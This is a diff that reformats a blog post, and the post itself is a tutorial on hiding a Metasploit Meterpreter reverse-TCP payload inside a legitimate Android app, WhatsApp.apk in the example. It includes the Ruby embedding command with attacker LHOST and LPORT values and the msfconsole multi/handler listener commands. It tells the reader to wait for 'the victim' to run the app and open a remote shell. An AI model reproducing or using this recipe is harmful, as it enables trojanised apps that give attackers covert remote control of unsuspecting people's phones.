@@ -1,18 +1,20 @@
 ---
-date: 2015-12-11 21:00:19+00:00
+layout: post
+date: 'Sat Dec 12 2015 02:30:19 GMT+0530 (India Standard Time)'
 slug: embed-metasploit-payload-in-apk-easily
 title: Embed a Metasploit Payload in an Original .apk File | Part 1 - The Easy Way
 wordpress_id: 13
 categories:
-- Android
-- Hacking
-- Metasploit
+  - Android
+  - Hacking
+  - Metasploit
 tags:
-- Android
-- Hacking
-- Kali
-- Metasploit
-- Meterpreter
+  - Android
+  - Hacking
+  - Kali
+  - Metasploit
+  - Meterpreter
+published: true
 ---
 
 Hi Fellas! I’m sure most of you, or at least those who have set a foot in the kingdom of hacking, have heard of Metasploit. Don’t be disappointed if you haven’t, because you’re in the right track.
@@ -34,7 +36,7 @@ Here’s where this tutorial comes in. I’m gonna show you how to take any .apk
 Just to be clear,  In this tutorial the operating system used is Kali Linux, which is a de facto standard OS for Penetration Testing (read, hacking). You should also install the latest version of ‘ApkTool’ and some libraries for the scripts to work properly.
 
 To install the required libraries, enter this command at the console:
-```
+```console
 apt-get install lib32stdc++6 lib32ncurses5 lib32z1
 ```
 
@@ -52,7 +54,7 @@ Download the Ruby script from [this link](https://github.com/SkullTech/apk-paylo
 ### Step 3
 
 Open a terminal, and type the following command:
-```
+```console
 ruby apk-embed-payload.rb WhatsApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895
 ```
 
@@ -68,8 +70,8 @@ At the prompt of the Ruby script, enter the number corresponding to the Activity
 
 This is the hardest step of all, so I’m posting some screenshots to make your life easier.
 
-![Screenshot from 2015-12-12 01-44-01](https://techkernel.org/wp-content/uploads/2015/12/screenshot-from-2015-12-12-01-44-01.png)
-![Screenshot from 2015-12-12 01-43-27](https://techkernel.org/wp-content/uploads/2015/12/screenshot-from-2015-12-12-01-43-27.png)
+![Screenshot from 2015-12-12 01-44-01](/img/posts/screenshot-from-2015-12-12-01-44-01.png)
+![Screenshot from 2015-12-12 01-43-27](/img/posts/screenshot-from-2015-12-12-01-43-27.png)
 
 
 ### PROFIT?!
@@ -78,7 +80,7 @@ If you did everything correctly, you should now get a apk file in your root dire
 
 As for the listener, you should use multi/handler and set the corresponding options accordingly. Just run the following commands.
 
-```   
+```console
 msfconsole
 use multi/handler
 set PAYLOAD android/meterpreter/reverse_tcp
@@ -89,7 +91,7 @@ exploit
 
 Now wait for the victim to run the app, when he does it, you will get a Meterpreter prompt in the terminal!
 
-![Screenshot from 2015-12-18 14:32:55](https://techkernel.org/wp-content/uploads/2015/12/screenshot-from-2015-12-18-143255.png)
+![Screenshot from 2015-12-18 14:32:55](/img/posts/screenshot-from-2015-12-18-143255.png)
 
 
 ### Note:
